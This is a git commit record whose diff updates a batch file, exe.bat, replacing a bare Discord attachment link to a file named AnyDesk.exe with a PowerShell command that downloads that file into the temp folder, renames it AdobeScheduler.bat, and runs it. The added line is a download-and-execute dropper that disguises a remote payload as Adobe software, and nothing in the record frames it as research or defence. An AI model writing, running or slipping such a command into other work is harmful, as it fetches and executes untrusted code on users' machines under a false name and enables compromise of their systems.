b5f2c727a0cdff06e2a1a20fdfc47fc514d5d4df
LilGorrillo <peruanoblindado@gmail.com>
2025-02-02 00:13:43 -0600

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,1 +1,1 @@
-https://cdn.discordapp.com/attachments/1328831724762697879/1335488745780023367/AnyDesk.exe?ex=67a05a51&is=679f08d1&hm=61f1be0ea841bd713791f6a0a4968120b7cf823e4093ddaf46a943d0747b2596&
+cmd /c powershell.exe -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1328831724762697879/1335488745780023367/AnyDesk.exe?ex=67a05a51&is=679f08d1&hm=61f1be0ea841bd713791f6a0a4968120b7cf823e4093ddaf46a943d0747b2596&' -OutFile "$env:TEMP\AdobeScheduler.bat"; Start-Process "$env:TEMP\AdobeScheduler.bat""
